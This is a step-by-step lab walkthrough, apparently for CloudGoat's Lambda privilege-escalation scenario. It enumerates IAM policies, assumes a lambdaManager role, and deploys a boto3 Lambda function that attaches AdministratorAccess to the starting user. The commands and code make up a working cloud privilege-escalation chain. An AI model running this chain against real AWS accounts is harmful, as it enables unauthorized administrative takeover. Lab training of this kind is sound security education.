# Initial Enumeration
### 1. Configuring Credentials
After launching the scenario, you will be provided with an Access Key ID and Secret Access Key. Configure these as a profile with the AWS CLI. 

```bash 
aws configure --profile chris
``` 

### 2. Confirming Credentials
After setting up the profile, it's always a good idea to confirm the credentials. You can do this with the following command: 

```bash
aws sts get-caller-identity --profile chris
```
This should provide you with the UserId, Account #, and ARN for the starting user. 


### 3. Checking Our Permissions 
Now that we have confirmed initial access, we want to see which permissions our user has in the AWS environment. One way we can do this is by seeing if our user has any policies attached or assigned to them. In AWS, a policy is essentially a JSON document that defines what actions (e.g., read, write) are allowed or denied on which resources (e.g., an S3 bucket, an EC2 instance). Policies can be attached to IAM users, groups, and roles to control their permissions and enforce security boundaries.

#### Inline Policies
Let's first check for inline policies. Inline policies are AWS IAM policies that are embedded directly into a single IAM user, group, or role. Unlike managed policies (which are standalone and can be attached to multiple entities), inline policies exist only for the specific entity they are attached to, so they provide a unique set of permissions that are tightly coupled to that one user, group, or role.

```bash
aws iam list-user-policies --user-name chris-<cloudgoat_id> --profile chris
```

#### Managed Policies
We do not have any inline policies. Let's check for managed policies. Managed policies are standalone IAM policies that are not embedded directly into a single entity. They can be created and administered either by AWS (AWS-managed policies) or by customers themselves (customer-managed policies). These policies can be attached to multiple users, groups, or roles, making them easier to maintain and reuse across different entities in your AWS environment.

```bash
aws iam list-attached-user-policies --user-name chris-<cloudgoat_id> --profile chris
```
Great, we found a policy! 

#### Policy Versions 
Policy versions let you keep multiple revisions of the same managed policy. You can store up to five versions of a policy at a time, with only one being the default (active) version. This makes it easier to revert to an older version if you need to undo a change or troubleshoot an issue.

When performing a penetration test or looking for privilege escalation paths, it’s important to inspect all versions of a policy because a non-default (inactive) version might contain broader or more permissive privileges than the currently active one. 

Let's list all the policy versions for this policy: 

```bash
aws iam list-policy-versions --policy-arn [Policy ARN] --profile chris
```

There is only only one version - v1. Let's list the specifics of this policy to see what we have access to. 
```bash
aws iam get-policy-version --policy-arn [Policy ARN] --version-id v1 --profile chris
```
This shows us that our user has access to IAM resources and the ability to assume roles. 

### 4. Hunting for Roles
Since we have the ability to list IAM resources and assume roles, we should see what roles are in the account (and hopefully we can assume one of them!) 

```bash
aws iam list-roles --profile chris
``` 
There is a cg-lambdaManager role able to be assumed by our user. This is due to the "Allow" in place for our user's ARN. 

To assume a role in AWS means to temporarily take on the access permissions associated with that role. It’s a way for an AWS user or service to gain credentials that allow different or expanded permissions, without permanently attaching those permissions to the primary identity.
```json
                "Version": "2012-10-17",
                "Statement": [
                    {
                        "Effect": "Allow",
                        "Principal": {
                            "AWS": "arn:aws:iam::703671921227:user/chris-lambda_privesc_cgidydajq393qx"
                        },
                        "Action": "sts:AssumeRole"
                    }
                ]
```
### 5. Assuming a New Role 


```bash
aws sts get-caller-identity

aws configure --profile Chris

aws iam list-user-policies --user-name chris-<cloudgoat_id> --profile Chris

aws iam list-attached-user-policies --user-name chris-<cloudgoat_id> --profile Chris

aws iam get-policy-version --policy-arn <cg-chris-policy arn> --version-id v1 --profile Chris
```

Our user has permissions to view IAM resources as well as assuming roles.

```bash
aws iam list-roles --profile Chris

aws iam list-attached-role-policies --role-name cg-debug-role-<cloudgoat_id> --profile Chris

aws iam list-attached-role-policies --role-name cg-lambdaManager-role-<cloudgoat_id> --profile Chris

aws iam get-policy-version --policy-arn <cg-lambdaManager-policy arn> --version-id v1 --profile Chris
```

The role grants permissions manage Lambda functions & pass roles that they can use. Assuming the role grants us its permissions.

```bash
aws sts assume-role --role-arn <cg-lambdaManager-role arn> --role-session-name lambdaManager --profile Chris
```

Then add the lambdaManager credentials to your AWS CLI credentials file at `~/.aws/credentials` as shown below:

```
[lambdaManager]
aws_access_key_id = {{AccessKeyId}}
aws_secret_access_key = {{SecretAccessKey}}
aws_session_token = {{SessionToken}}
```

**Note**: The name of the file needs to be `lambda_function.py`.

````py
import boto3

def lambda_handler(event, context):
	client = boto3.client('iam')

	response = client.attach_user_policy(
		UserName = 'chris-<cloudgoat_id>',
		PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
	)

	return response
````

Create the function and invoke it to grant our user admin permissions.

```bash
zip -r lambda_function.py.zip lambda_function.py

aws lambda create-function --function-name admin_function --runtime python3.9 --role <cg-debug-role arn> --handler lambda_function.lambda_handler --zip-file fileb://lambda_function.py.zip --profile lambdaManager

aws lambda invoke --function-name admin_function out.txt --profile lambdaManager

aws iam list-attached-user-policies --user-name chris-<cloudgoat_id> --profile Chris
```
